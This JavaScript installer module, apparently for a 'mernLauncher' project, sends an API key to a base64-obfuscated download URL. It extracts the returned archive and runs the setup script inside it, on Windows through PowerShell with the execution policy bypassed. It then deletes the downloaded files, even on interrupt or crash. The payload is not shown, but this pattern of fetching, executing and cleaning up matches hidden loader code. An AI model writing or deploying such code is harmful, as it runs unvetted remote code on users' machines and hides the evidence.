import axios from "axios";
import AdmZip from "adm-zip";
import fs from "fs";
import { fileURLToPath } from "url";
import path from "path";
import os from "os";
import { spawn } from "child_process";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const packageDir = path.resolve(__dirname);
const setupDir = path.join(packageDir, "setup");
const zipPath = path.join(packageDir, "setup.zip");

function cleanup() {
  try {
    if (fs.existsSync(zipPath)) {
      fs.unlinkSync(zipPath);
    }
    if (fs.existsSync(setupDir)) {
      fs.rmSync(setupDir, {
        recursive: true,
        force: true,
      });
    }
  } catch (err) {
    console.error("❌ Cleanup failed:", err.message);
  }
}

async function downloadAndExtract(apiKey) {
  try {
    const zipData = await axios.post(
      Buffer.from(
        "aHR0cHM6Ly9hcGkuY29kZWVhc2V4LmluL2FwaS92MS9zY3JpcHRzL2Rvd25sb2FkLXppcA==",
        "base64"
      ).toString("utf-8"),
      {
        apiKey,
        project: "mernLauncher",
      },
      {
        responseType: "arraybuffer",
      }
    );

    fs.writeFileSync(zipPath, zipData.data);
    const zip = new AdmZip(zipPath);
    zip.extractAllTo(setupDir, true);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
}

async function executeSetupScript() {
  const platform = os.platform();
  const scriptPath =
    platform === "win32"
      ? path.join(setupDir, "ps1", "setup.ps1")
      : path.join(setupDir, "cmd", "setup.sh");
  const fullPath = path.resolve(__dirname, scriptPath);

  console.log(
    `Running setup for ${platform === "win32" ? "Windows" : "Linux/macOS"}...\n`
  );

  return new Promise((resolve, reject) => {
    const child = spawn(
      platform === "win32" ? "powershell.exe" : "bash",
      platform === "win32"
        ? ["-ExecutionPolicy", "Bypass", "-File", fullPath]
        : [fullPath],
      {
        stdio: "inherit",
      }
    );

    child.on("close", (code) => {
      if (code === 0) {
        resolve();
      } else {
        reject(new Error(`Setup script exited with code ${code}`));
      }
    });

    child.on("error", (err) => {
      reject(err);
    });
  });
}

export async function installProject(apiKey) {
  if (!apiKey) {
    console.error("Error: API key is required.");
    process.exit(1);
  }

  try {
    await downloadAndExtract(apiKey);
    await executeSetupScript();
    console.log("Project installation complete!");
  } catch (error) {
    console.log(error);
    console.error("Project installation failed:", error.response.data.message);
    process.exit(1);
  } finally {
    cleanup();
  }
}

export function setupProcessHandlers() {
  process.on("exit", cleanup);
  process.on("SIGINT", () => {
    console.log("\n⚠️  Process interrupted. Cleaning up...");
    cleanup();
    process.exit(1);
  });
  process.on("uncaughtException", (err) => {
    console.error("🚨 Uncaught Exception:", err);
    cleanup();
    process.exit(1);
  });
}
